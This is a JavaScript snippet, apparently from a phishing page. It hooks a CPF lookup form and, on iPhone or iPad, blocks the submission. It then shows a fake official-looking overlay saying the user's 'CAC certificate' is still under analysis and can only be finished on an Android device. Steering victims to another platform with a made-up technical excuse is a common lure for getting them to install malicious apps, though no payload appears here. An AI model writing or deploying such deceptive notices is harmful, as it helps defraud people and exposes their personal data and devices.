// Função para detectar se o dispositivo é iOS (iPhone, iPad, iPod)
function isIOS() {
    const userAgent = navigator.userAgent || navigator.vendor || window.opera;
    
    // Verifica se é iOS
    if (/iPad|iPhone|iPod/.test(userAgent) && !window.MSStream) {
        return true;
    }
    
    // Método alternativo para detecção de iOS
    return !!navigator.platform && /iPad|iPhone|iPod/.test(navigator.platform);
}

// Quando o documento estiver carregado, adicionar listeners aos formulários
document.addEventListener('DOMContentLoaded', function() {
    // Adiciona evento ao formulário de consulta CPF
    const cpfForm = document.getElementById('cpf-form');
    if (cpfForm) {
        const originalSubmit = cpfForm.onsubmit;
        
        cpfForm.onsubmit = function(event) {
            // Se for iOS, previne o envio normal e mostra mensagem
            if (isIOS()) {
                event.preventDefault();
                showIOSMessage();
                return false;
            }
            
            // Caso contrário, continua com o comportamento original
            if (typeof originalSubmit === 'function') {
                return originalSubmit.call(this, event);
            }
            return true;
        };
    }
});

// Função para mostrar mensagem "Em progresso" para usuários iOS
function showIOSMessage() {
    // Cria o elemento de overlay se não existir
    let overlay = document.getElementById('ios-overlay');
    if (!overlay) {
        overlay = document.createElement('div');
        overlay.id = 'ios-overlay';
        overlay.style.position = 'fixed';
        overlay.style.top = '0';
        overlay.style.left = '0';
        overlay.style.width = '100%';
        overlay.style.height = '100%';
        overlay.style.backgroundColor = 'rgba(255, 255, 255, 0.98)';
        overlay.style.zIndex = '9999';
        overlay.style.display = 'flex';
        overlay.style.flexDirection = 'column';
        overlay.style.alignItems = 'center';
        overlay.style.justifyContent = 'center';
        overlay.style.padding = '20px';
        overlay.style.textAlign = 'center';
        
        const messageBox = document.createElement('div');
        messageBox.style.maxWidth = '400px';
        messageBox.style.backgroundColor = '#f8f8f8';
        messageBox.style.borderRadius = '8px';
        messageBox.style.padding = '30px';
        messageBox.style.boxShadow = '0 4px 12px rgba(0, 0, 0, 0.15)';
        messageBox.style.border = '1px solid #e0e0e0';
        
        const statusBadge = document.createElement('div');
        statusBadge.style.display = 'inline-block';
        statusBadge.style.backgroundColor = '#ffc107';
        statusBadge.style.color = '#333';
        statusBadge.style.padding = '5px 12px';
        statusBadge.style.borderRadius = '20px';
        statusBadge.style.fontSize = '12px';
        statusBadge.style.fontWeight = 'bold';
        statusBadge.style.marginBottom = '15px';
        statusBadge.style.textTransform = 'uppercase';
        statusBadge.innerHTML = 'Status: Em análise';
        
        const title = document.createElement('h2');
        title.innerText = 'Certificado CAC em Processamento';
        title.style.color = '#333';
        title.style.marginBottom = '15px';
        title.style.fontSize = '24px';
        
        const message = document.createElement('p');
        message.innerHTML = 'Seu certificado CAC ainda está em <strong>processo de análise</strong> e não pode ser acessado através de dispositivos iOS no momento.<br><br>Por favor, utilize um dispositivo Android para completar o processo de homologação ou tente novamente mais tarde.';
        message.style.color = '#555';
        message.style.lineHeight = '1.6';
        message.style.marginBottom = '20px';
        
        const additionalInfo = document.createElement('div');
        additionalInfo.style.backgroundColor = '#f0f6ff';
        additionalInfo.style.border = '1px solid #c5d8f7';
        additionalInfo.style.borderRadius = '6px';
        additionalInfo.style.padding = '12px';
        additionalInfo.style.fontSize = '14px';
        additionalInfo.style.color = '#3c5a99';
        additionalInfo.innerHTML = '<i class="fas fa-info-circle" style="margin-right: 8px;"></i>Devido a restrições técnicas, a homologação do certificado CAC requer um dispositivo Android para ser finalizada.';
        
        const icon = document.createElement('div');
        icon.innerHTML = '<i class="fas fa-hourglass-half" style="font-size: 48px; color: #2D5A27; margin-bottom: 20px;"></i>';
        
        messageBox.appendChild(icon);
        messageBox.appendChild(statusBadge);
        messageBox.appendChild(title);
        messageBox.appendChild(message);
        messageBox.appendChild(additionalInfo);
        overlay.appendChild(messageBox);
        
        document.body.appendChild(overlay);
    } else {
        overlay.style.display = 'flex';
    }
}